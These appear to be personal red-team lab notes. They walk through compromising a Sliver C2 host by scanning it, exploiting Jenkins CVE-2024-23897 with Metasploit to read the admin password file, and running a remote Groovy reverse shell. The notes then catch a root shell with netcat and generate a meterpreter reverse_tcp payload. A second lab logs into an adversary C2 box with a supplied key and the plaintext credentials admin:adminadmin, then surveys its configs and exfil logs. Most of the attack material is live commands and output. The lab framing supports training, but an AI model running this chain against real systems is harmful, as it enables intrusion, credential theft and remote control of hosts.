# Pull before it gets taken down again:
[GitHub - BigBodyCobain/Shadowbroker: Open-source intelligence for the global theater. Track everything from the corporate/private jets of the wealthy, and spy satellites, to seismic events in one unified interface. Hook an AI agent up to have it parse through data and find previously unseen correlations. The knowledge is available to all but rarely aggregated in the open, until now. · GitHub](https://github.com/BigBodyCobain/Shadowbroker)

# Deception
human decision making cycle: 
	See, Think, Do
influence the cycle by following the cycle in reverse.
	- what do you want them to do?
	- what do they need think in order to follow through with it?
	- what do we have them see to trigger those thoughts?

# Pyramid of Pain
top - TTPs - 
middle - IPs - scanning
bottom - 
	Hashs - search for hash, use whitelsting
	IOCs -

# The Handoff Package
document the method for accessing the system well (msf payload, port, times, etc.)

---

# attacking a sliver server
```
──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sS -sC --script="vuln" 10.1.10.196           
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-08 10:46 -0400
Nmap scan report for 10.1.10.196
Host is up (0.00012s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE    SERVICE   VERSION
22/tcp   open     ssh       OpenSSH 10.2p1 Ubuntu 2ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:10.2p1: 
|       CVE-2026-35414  8.1     https://vulners.com/cve/CVE-2026-35414
|       CVE-2026-35386  8.1     https://vulners.com/cve/CVE-2026-35386
|       CVE-2026-35385  8.1     https://vulners.com/cve/CVE-2026-35385
|       CVE-2026-35387  6.5     https://vulners.com/cve/CVE-2026-35387
|_      CVE-2026-35388  2.5     https://vulners.com/cve/CVE-2026-35388
80/tcp   open     http      OpenResty web app server
|_http-server-header: openresty
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://www.securityfocus.com/bid/49303
|       https://www.tenable.com/plugins/nessus/55976
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
81/tcp   open     http      OpenResty web app server
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://www.securityfocus.com/bid/49303
|       https://www.tenable.com/plugins/nessus/55976
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 172.18.0.2
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: openresty
443/tcp  open     ssl/https openresty
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: openresty
5000/tcp filtered upnp
8080/tcp open     http      Jetty 10.0.18
|_http-server-header: Jetty(10.0.18)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /robots.txt: Robots file
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
MAC Address: 00:0C:29:44:71:1C (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.73 seconds

┌──(kali㉿kali)-[~]
└─$ curl http://10.1.10.196:8080 -v
*   Trying 10.1.10.196:8080...
* Established connection to 10.1.10.196 (10.1.10.196 port 8080) from 10.1.10.56 port 43710 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.1.10.196:8080
> User-Agent: curl/8.18.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 403 Forbidden
< Date: Tue, 09 Jun 2026 11:47:01 GMT
< X-Content-Type-Options: nosniff
< Set-Cookie: JSESSIONID.bd169905=node01bez1fivweceo28s4fbv23fo2694849.node0; Path=/; HttpOnly
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< Content-Type: text/html;charset=utf-8
< X-Hudson: 1.395
< X-Jenkins: 2.440
< X-Jenkins-Session: 80bd7e16
< Transfer-Encoding: chunked
< Server: Jetty(10.0.18)
< 
<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script id='redirect' data-redirect-url='/login?from=%2F' src='/static/80bd7e16/scripts/redirect.js'></script></head><body style='background-color:white; color:white;'>
Authentication required
<!--
-->

* Connection #0 to host 10.1.10.196:8080 left intact
</body></html>                                   
```

# Vulnerable jenkins instance
#### Console 1
```
msf auxiliary(gather/jenkins_cli_ampersand_arbitrary_file_read) > info

       Name: Jenkins cli Ampersand Replacement Arbitrary File Read
     Module: auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2024-01-24

Provided by:
  h00die
  Yaniv Nizry
  binganao
  h4x0r-dz
  Vozec

Module stability:
 crash-safe

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  FILE_PATH  /etc/passwd      yes       File path to read from the server
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4,
                                         socks5, socks5h, http
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
                                        it.html
  RPORT      8080             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The base path for Jenkins
  VHOST                       no        HTTP server virtual host

Description:
  This module utilizes the Jenkins cli protocol to run the `help` command.
  The cli is accessible with read-only permissions by default, which are
  all thats required.

  Jenkins cli utilizes `args4j's` `parseArgument`, which calls `expandAtFiles` to
  replace any `@<filename>` with the contents of a file. We are then able to retrieve
  the error message to read up to the first two lines of a file.

  Exploitation by hand can be done with the cli, see markdown documents for additional
  instructions.

  There are a few exploitation oddities:
  1. The injection point for the `help` command requires 2 input arguments.
  When the `expandAtFiles` is called, each line of the `FILE_PATH` becomes an input argument.
  If a file only contains one line, it will throw an error: `ERROR: You must authenticate to access this Jenkins.`
  However, we can pad out the content by supplying a first argument.
  2. There is a strange timing requirement where the `download` (or first) request must get
  to the server first, but the `upload` (or second) request must be very close behind it.
  From testing against the docker image, it was found values between `.01` and `1.9` were
  viable. Due to the round trip time of the first request and response happening before
  request 2 would be received, it is necessary to use threading to ensure the requests
  happen within rapid succession.

  Files of value:
  * /var/jenkins_home/secret.key
  * /var/jenkins_home/secrets/master.key
  * /var/jenkins_home/secrets/initialAdminPassword
  * /etc/passwd
  * /etc/shadow
  * Project secrets and credentials
  * Source code, build artifacts

References:
  https://www.jenkins.io/security/advisory/2024-01-24/
  https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins/
  https://github.com/binganao/CVE-2024-23897
  https://github.com/h4x0r-dz/CVE-2024-23897
  https://github.com/Vozec/CVE-2024-23897
  https://nvd.nist.gov/vuln/detail/CVE-2024-23897


View the full module info with the info -d command.

msf auxiliary(gather/jenkins_cli_ampersand_arbitrary_file_read) > set RHOST 10.1.10.196
RHOST => 10.1.10.196
msf auxiliary(gather/jenkins_cli_ampersand_arbitrary_file_read) > set FILE_PATH /var/lib/jenkins/secrets/initialAdminPassword
FILE_PATH => /var/lib/jenkins/secrets/initialAdminPassword
msf auxiliary(gather/jenkins_cli_ampersand_arbitrary_file_read) > run
[*] Running module against 10.1.10.196
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Found exploitable version: 2.440
[*] Sending requests with UUID: f5e73944-040c-44d8-8086-e72527de3e8a
[*] Re-attempting with padding for single line output file
[+] /var/lib/jenkins/secrets/initialAdminPassword file contents retrieved (first line or 2):
c7637374312040a7b54bfe1a908848cf
[+] Results saved to: /home/kali/.msf4/loot/20260608125353_default_10.1.10.196_jenkins.file_919444.txt
[*] Auxiliary module execution completed

```

- Login to the site using admin and the found password
- Manage Jenkins > Script Console
	- https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
#### Console 2
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.1.10.56] from (UNKNOWN) [10.1.10.196] 53822
whoami
root
```

# Upgrade the shell
```
msf > use payload/linux/x64/meterpreter/reverse_tcp 
msf payload(linux/x64/meterpreter/reverse_tcp) > info

       Name: Linux Mettle x64, Reverse TCP Stager
     Module: payload/linux/x64/meterpreter/reverse_tcp
   Platform: Linux, Linux
       Arch: x64
Needs Admin: No
 Total size: 130
       Rank: Normal

Provided by:
  Brent Cook <bcook@rapid7.com>
  ricky
  tkmru

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Description:
  Inject the mettle server payload (staged).

  Connect back to the attacker



View the full module info with the info -d command.

msf payload(linux/x64/meterpreter/reverse_tcp) > generate -f elf -o rev
[*] Writing 250 bytes to rev...
msf payload(linux/x64/meterpreter/reverse_tcp) > handler -p inux/x64/meterpreter/reverse_tcp -h 0.0.0.0 -P 5656
[-] Invalid Payload Name Supplied!
msf payload(linux/x64/meterpreter/reverse_tcp) > handler -p linux/x64/meterpreter/reverse_tcp -h 0.0.0.0 -P 5656
Usage: handler [options]

Spin up a Payload Handler as background job.

OPTIONS:

    -e   An Encoder to use for Payload Stage Encoding
    -h   Help Banner
    -H   The RHOST/LHOST to configure the handler for
    -n   The custom name to give the handler job
    -p   The payload to configure the handler for
    -P   The RPORT/LPORT to configure the handler for
    -x   Shut the Handler down after a session is established
msf payload(linux/x64/meterpreter/reverse_tcp) > handler -p linux/x64/meterpreter/reverse_tcp -H 0.0.0.0 -P 5656
[*] Payload handler running as background job 0.

[*] Started reverse TCP handler on 0.0.0.0:5656 
msf payload(linux/x64/meterpreter/reverse_tcp) > [*] Sending stage (3090404 bytes) to 10.1.10.196
[*] Meterpreter session 1 opened (10.1.10.56:5656 -> 10.1.10.196:37440) at 2026-06-08 14:16:46 -0400

```

Make Tunnels
proxychains nmap
grab the config file
setup and connect to the sliver server via proxychains


---

# Lab 4.1
[[Lab L4.1a - Disable Adversary Tooling]]
## Prep the key
```trem1
┌──(root㉿blue-ops)-[/home/kali]
└─# ls -la
total 16712
drwx------ 22 kali kali     4096 Jun  9 08:10 .
drwxr-xr-x  6 root root     4096 Jan  8 08:22 ..
-rw-r--r--  1 kali kali      220 Jan  7 18:51 .bash_logout
-rw-r--r--  1 kali kali     5551 Jan  7 18:51 .bashrc
-rw-r--r--  1 kali kali     3526 Jan  7 18:51 .bashrc.original
drwxrwxr-x 11 kali kali     4096 Feb 25 12:40 .cache
-rw-rw-r--  1 kali kali     8010 Feb 25 10:06 changes.patch
drwxrwxr-x  2 kali kali     4096 Feb 24 12:28 compose_debs
drwxr-xr-x 16 kali kali     4096 Feb 24 11:52 .config
drwxrwxr-x  6 kali kali     4096 Feb 25 11:07 cs-oc
-rw-rw-r--  1 kali kali 16897955 Feb 24 12:11 cs-oc.tar.bz2
drwxr-xr-x  2 kali kali     4096 Jan  8 10:09 Desktop
-rw-r--r--  1 kali kali       35 Jan  7 18:56 .dmrc
drwxr-xr-x  2 kali kali     4096 Feb 25 10:17 Documents
drwxr-xr-x  2 kali kali     4096 Jan  7 18:56 Downloads
-rw-r--r--  1 kali kali    11759 Jan  7 18:51 .face
lrwxrwxrwx  1 kali kali        5 Jan  7 18:51 .face.icon -> .face
drwx------  3 kali kali     4096 Jan  7 18:56 .gnupg
drwxr-xr-x  2 root root     4096 Mar 12 07:11 .havoc
-rw-------  1 kali kali        0 Jan  7 18:56 .ICEauthority
-rw-r--r--  1 root root      362 Jan  8 08:36 install_packages.log
drwxr-xr-x  3 kali kali     4096 Jan  7 18:51 .java
drwxr-xr-x  5 kali kali     4096 Jan  7 18:56 .local
drwxrwxr-x  5 kali kali     4096 Feb 24 13:22 .mozilla
drwxr-xr-x  2 kali kali     4096 Jan  7 18:56 Music
-rw-r--r--  1 root root      640 Jan  8 08:22 packages.microsoft.gpg
drwxr-xr-x  2 kali kali     4096 Jan  7 18:56 Pictures
drwx------  3 kali kali     4096 Jan  8 08:59 .pki
-rw-r--r--  1 kali kali      807 Jan  7 18:51 .profile
drwxr-xr-x  2 kali kali     4096 Jan  7 18:56 Public
drwx------  3 kali kali     4096 Jun  8 09:30 .ssh
-rw-r--r--  1 kali kali        0 Jan  7 18:56 .sudo_as_admin_successful
-rw-------  1 kali kali      399 Jun  8 09:29 super_secret_key
drwxr-xr-x  2 kali kali     4096 Jan  7 18:56 Templates
drwxr-xr-x  2 kali kali     4096 Jan  7 18:56 Videos
drwxr-xr-x  2 kali kali     4096 Feb 25 10:17 .vim
-rw-------  1 kali kali    14376 Mar 12 10:15 .viminfo
-rw-------  1 kali kali       53 Jun  9 08:10 .Xauthority
-rw-------  1 kali kali     4833 Jun  9 08:11 .xsession-errors
-rw-------  1 kali kali     4742 Jun  8 23:54 .xsession-errors.old
-rw-r--r--  1 kali kali      336 Jan  7 18:51 .zprofile
-rw-------  1 kali kali    10056 Mar 12 13:38 .zsh_history
-rw-r--r--  1 kali kali    10855 Jan  7 18:51 .zshrc

┌──(root㉿blue-ops)-[/home/kali]
└─# cp super_secret_key super_secret_key.backup

┌──(root㉿blue-ops)-[/home/kali]
└─# chmod 400 super_secret_key
```

## Connect to the first box and verify location
```term1
┌──(root㉿blue-ops)-[/home/kali]
└─# ssh foothold@20.30.40.150 -p 2222 -i super_secret_key
The authenticity of host '[20.30.40.150]:2222 ([20.30.40.150]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:bDY+Ke4QPou3DRxwiE7wj1d9UC0Exe+9sW2m7ZzIw8I
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[20.30.40.150]:2222' (ED25519) to the list of known hosts.
Linux e5316a5b004d 6.17.10+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.17.10-1kali1 (2025-12-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

foothold@e5316a5b004d:~$ hostname && whoami && pwd
e5316a5b004d
foothold
/home/foothold

```

## Verify C2 admin visibility
```term2
┌──(root㉿blue-ops)-[/home/kali]
└─# curl -u admin:adminadmin http://20.30.40.150:8080/admin
{"note":"Use approved remote foothold channel for maintenance actions.","panel":"adv-c2 admin shim","status":"authenticated"}
```

## Survey the box
```
foothold@e5316a5b004d:~$ ps -lef
F S UID          PID    PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD                                  
4 S root           1       0  0  80   0 -  9673 -      04:22 ?        00:00:04 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/conf.d/c2.conf
5 S root          15       1  0  80   0 -  1069 -      04:22 ?        00:00:00 cron                                 
1 S root          17       1  0  80   0 -  3659 -      04:22 ?        00:00:00 nginx: master process nginx          
5 S nobody        18      17  0  80   0 -  3773 -      04:22 ?        00:00:00 nginx: worker process                
5 S nobody        19      17  0  80   0 -  3773 -      04:22 ?        00:00:00 nginx: worker process                
5 S nobody        20      17  0  80   0 -  3773 -      04:22 ?        00:00:00 nginx: worker process                
5 S nobody        21      17  0  80   0 -  3773 -      04:22 ?        00:00:00 nginx: worker process                
4 S c2-app        22       1  0  80   0 -  9058 -      04:22 ?        00:00:04 /usr/local/bin/python3.11 /usr/local/bin/gunicorn -b 127.0.0.1:9000 --workers 2 app:app
4 S c2-app        23       1  0  80   0 -  9058 -      04:22 ?        00:00:03 /usr/local/bin/python3.11 /usr/local/bin/gunicorn -b 127.0.0.1:9001 --workers 2 app:app
4 S root          24       1  0  80   0 -  2944 -      04:22 ?        00:00:00 sshd: /usr/sbin/sshd -D -e [listener] 0 of 10-100 startups
5 S c2-app        25      23  0  80   0 - 10896 -      04:22 ?        00:00:01 /usr/local/bin/python3.11 /usr/local/bin/gunicorn -b 127.0.0.1:9001 --workers 2 app:app
5 S c2-app        26      22  0  80   0 - 10896 -      04:22 ?        00:00:01 /usr/local/bin/python3.11 /usr/local/bin/gunicorn -b 127.0.0.1:9000 --workers 2 app:app
5 S c2-app        27      23  0  80   0 - 10896 -      04:22 ?        00:00:01 /usr/local/bin/python3.11 /usr/local/bin/gunicorn -b 127.0.0.1:9001 --workers 2 app:app
5 S c2-app        28      22  0  80   0 - 10896 -      04:22 ?        00:00:01 /usr/local/bin/python3.11 /usr/local/bin/gunicorn -b 127.0.0.1:9000 --workers 2 app:app
4 S root       17207      24  0  80   0 -  4698 -      12:16 ?        00:00:00 sshd-session: foothold [priv]
5 S foothold   17214   17207  0  80   0 -  4721 -      12:16 ?        00:00:00 sshd-session: foothold@pts/0
4 S foothold   17215   17214  0  80   0 -  1082 do_wai 12:16 pts/0    00:00:00 -bash
4 R foothold   17793   17215  0  80   0 -  1612 -      12:32 pts/0    00:00:00 ps -lef

foothold@e5316a5b004d:~$ cat /etc/supervisor/conf.d/c2.conf 
[supervisord]
nodaemon=true
logfile=/var/log/adv-c2/supervisord.log
pidfile=/var/run/supervisord.pid

[program:c2-admin]
command=/usr/local/bin/gunicorn -b 127.0.0.1:9000 --workers 2 app:app
directory=/opt/c2
user=c2-app
autostart=true
autorestart=true
stdout_logfile=/var/log/adv-c2/c2-admin.log
stderr_logfile=/var/log/adv-c2/c2-admin.err.log

[program:c2-ingest]
command=/usr/local/bin/gunicorn -b 127.0.0.1:9001 --workers 2 app:app
directory=/opt/c2
user=c2-app
autostart=true
autorestart=true
stdout_logfile=/var/log/adv-c2/c2-ingest.log
stderr_logfile=/var/log/adv-c2/c2-ingest.err.log

[program:sshd]
command=/usr/sbin/sshd -D -e
autostart=true
autorestart=true
stdout_logfile=/var/log/adv-c2/sshd.log
stderr_logfile=/var/log/adv-c2/sshd.err.log

foothold@e5316a5b004d:/var/www/html$ ls -la /var/log/adv-c2/
total 396
drwxr-xr-x 2 c2-app c2-app   4096 Jun  8 12:36 .
drwxr-xr-x 1 root   root     4096 Jun  9 12:16 ..
-rw-r--r-- 1 c2-app c2-app 296476 Jun  9 12:56 access.log
-rw-r--r-- 1 c2-app c2-app   6291 Jun  9 04:22 c2-admin.err.log
-rw-r--r-- 1 c2-app c2-app      0 Jun  8 12:36 c2-admin.log
-rw-r--r-- 1 c2-app c2-app   6291 Jun  9 04:22 c2-ingest.err.log
-rw-r--r-- 1 c2-app c2-app      0 Jun  8 12:36 c2-ingest.log
-rw-r--r-- 1 c2-app c2-app  47931 Jun  9 04:22 drain.log
-rw-r--r-- 1 c2-app c2-app      0 Jun  9 04:22 error.log
-rw-r--r-- 1 c2-app c2-app   2024 Jun  9 12:16 sshd.err.log
-rw-r--r-- 1 c2-app c2-app      0 Jun  8 12:36 sshd.log
-rw-r--r-- 1 c2-app c2-app  12595 Jun  9 04:22 supervisord.log

foothold@e5316a5b004d:/var/www/html$ tail -20 /var/log/adv-c2/supervisord.log 
2026-06-09 02:56:40,366 INFO supervisord started with pid 1
2026-06-09 02:56:41,370 INFO spawned: 'c2-admin' with pid 23
2026-06-09 02:56:41,371 INFO spawned: 'c2-ingest' with pid 24
2026-06-09 02:56:41,373 INFO spawned: 'sshd' with pid 25
2026-06-09 02:56:43,026 INFO success: c2-admin entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2026-06-09 02:56:43,026 INFO success: c2-ingest entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2026-06-09 02:56:43,026 INFO success: sshd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2026-06-09 03:55:15,949 WARN received SIGTERM indicating exit request
2026-06-09 03:55:15,949 INFO waiting for c2-admin, c2-ingest, sshd to die
2026-06-09 03:55:15,950 INFO stopped: sshd (exit status 0)
2026-06-09 03:55:17,079 INFO stopped: c2-ingest (exit status 0)
2026-06-09 03:55:17,199 INFO stopped: c2-admin (exit status 0)
2026-06-09 04:22:44,918 CRIT Supervisor is running as root.  Privileges were not dropped because no user is specified in the config file.  If you intend to run as root, you can set user=root in the config file to avoid this message.
2026-06-09 04:22:44,925 INFO supervisord started with pid 1
2026-06-09 04:22:45,928 INFO spawned: 'c2-admin' with pid 22
2026-06-09 04:22:45,938 INFO spawned: 'c2-ingest' with pid 23
2026-06-09 04:22:45,946 INFO spawned: 'sshd' with pid 24
2026-06-09 04:22:47,758 INFO success: c2-admin entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2026-06-09 04:22:47,758 INFO success: c2-ingest entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
2026-06-09 04:22:47,759 INFO success: sshd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)

foothold@e5316a5b004d:/var/www/html$ tail -30 /var/log/adv-c2/drain.log 
  File "/usr/local/lib/python3.11/site-packages/psycopg2/__init__.py", line 122, in connect
    conn = _connect(dsn, connection_factory=connection_factory, **kwasync)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
psycopg2.OperationalError: connection to server at "20.30.40.151", port 5432 failed: No route to host
        Is the server running on that host and accepting TCP/IP connections?

Traceback (most recent call last):
  File "/opt/c2/drain.py", line 172, in <module>
    main()
  File "/opt/c2/drain.py", line 112, in main
    conn = psycopg2.connect(dsn)
           ^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.11/site-packages/psycopg2/__init__.py", line 122, in connect
    conn = _connect(dsn, connection_factory=connection_factory, **kwasync)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
psycopg2.OperationalError: connection to server at "20.30.40.151", port 5432 failed: No route to host
        Is the server running on that host and accepting TCP/IP connections?

foothold@e5316a5b004d:/var/www/html$ tail -30 /var/log/adv-c2/access.log 
127.0.0.1 - - [09/Jun/2026:12:55:28 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:12:55:43 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:12:55:58 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
172.18.0.1 - - [09/Jun/2026:12:56:01 +0000] "POST /exfil HTTP/1.1" 200 106 "-" "python-requests/2.34.2"
127.0.0.1 - - [09/Jun/2026:12:56:14 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:12:56:29 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:12:56:44 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:12:56:59 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
172.18.0.1 - - [09/Jun/2026:12:57:01 +0000] "POST /exfil HTTP/1.1" 200 106 "-" "python-requests/2.34.2"
127.0.0.1 - - [09/Jun/2026:12:57:14 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:12:57:29 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:12:57:44 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:12:57:59 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
172.18.0.1 - - [09/Jun/2026:12:58:02 +0000] "POST /exfil HTTP/1.1" 200 106 "-" "python-requests/2.34.2"
127.0.0.1 - - [09/Jun/2026:12:58:14 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:12:58:29 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:12:58:44 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:12:58:59 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
172.18.0.1 - - [09/Jun/2026:12:59:01 +0000] "POST /exfil HTTP/1.1" 200 106 "-" "python-requests/2.34.2"
127.0.0.1 - - [09/Jun/2026:12:59:14 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:12:59:29 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:12:59:45 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:13:00:00 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
172.18.0.1 - - [09/Jun/2026:13:00:01 +0000] "POST /exfil HTTP/1.1" 200 106 "-" "python-requests/2.34.2"
127.0.0.1 - - [09/Jun/2026:13:00:15 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:13:00:30 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:13:00:45 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
127.0.0.1 - - [09/Jun/2026:13:01:00 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"
172.18.0.1 - - [09/Jun/2026:13:01:01 +0000] "POST /exfil HTTP/1.1" 200 106 "-" "python-requests/2.34.2"
127.0.0.1 - - [09/Jun/2026:13:01:15 +0000] "GET /healthz HTTP/1.1" 200 16 "-" "curl/8.14.1"

foothold@e5316a5b004d:~$ cat /etc/services 
# Network services, Internet style
#
# Updated from https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml .
#
# New ports will be added on request if they have been officially assigned
# by IANA and used in the real-world or are needed by a debian package.
# If you need a huge list of used numbers please install the nmap package.

tcpmux          1/tcp                           # TCP port service multiplexer
echo            7/tcp
echo            7/udp
discard         9/tcp           sink null
discard         9/udp           sink null
systat          11/tcp          users
daytime         13/tcp
daytime         13/udp
netstat         15/tcp
qotd            17/tcp          quote
chargen         19/tcp          ttytst source
chargen         19/udp          ttytst source
ftp-data        20/tcp
ftp             21/tcp
fsp             21/udp          fspd
ssh             22/tcp                          # SSH Remote Login Protocol
telnet          23/tcp
smtp            25/tcp          mail
time            37/tcp          timserver
time            37/udp          timserver
whois           43/tcp          nicname
tacacs          49/tcp                          # Login Host Protocol (TACACS)
tacacs          49/udp
domain          53/tcp                          # Domain Name Server
domain          53/udp
bootps          67/udp
bootpc          68/udp
tftp            69/udp
gopher          70/tcp                          # Internet Gopher
finger          79/tcp
http            80/tcp          www             # WorldWideWeb HTTP
kerberos        88/tcp          kerberos5 krb5 kerberos-sec     # Kerberos v5
kerberos        88/udp          kerberos5 krb5 kerberos-sec     # Kerberos v5
iso-tsap        102/tcp         tsap            # part of ISODE
acr-nema        104/tcp         dicom           # Digital Imag. & Comm. 300
pop3            110/tcp         pop-3           # POP version 3
sunrpc          111/tcp         portmapper      # RPC 4.0 portmapper
sunrpc          111/udp         portmapper
auth            113/tcp         authentication tap ident
nntp            119/tcp         readnews untp   # USENET News Transfer Protocol
ntp             123/udp                         # Network Time Protocol
epmap           135/tcp         loc-srv         # DCE endpoint resolution
netbios-ns      137/udp                         # NETBIOS Name Service
netbios-dgm     138/udp                         # NETBIOS Datagram Service
netbios-ssn     139/tcp                         # NETBIOS session service
imap2           143/tcp         imap            # Interim Mail Access P 2 and 4
snmp            161/tcp                         # Simple Net Mgmt Protocol
snmp            161/udp
snmp-trap       162/tcp         snmptrap        # Traps for SNMP
snmp-trap       162/udp         snmptrap
cmip-man        163/tcp                         # ISO mgmt over IP (CMOT)
cmip-man        163/udp
cmip-agent      164/tcp
cmip-agent      164/udp
mailq           174/tcp                 # Mailer transport queue for Zmailer
xdmcp           177/udp                 # X Display Manager Control Protocol
bgp             179/tcp                         # Border Gateway Protocol
smux            199/tcp                         # SNMP Unix Multiplexer
qmtp            209/tcp                         # Quick Mail Transfer Protocol
z3950           210/tcp         wais            # NISO Z39.50 database
ipx             213/udp                         # IPX [RFC1234]
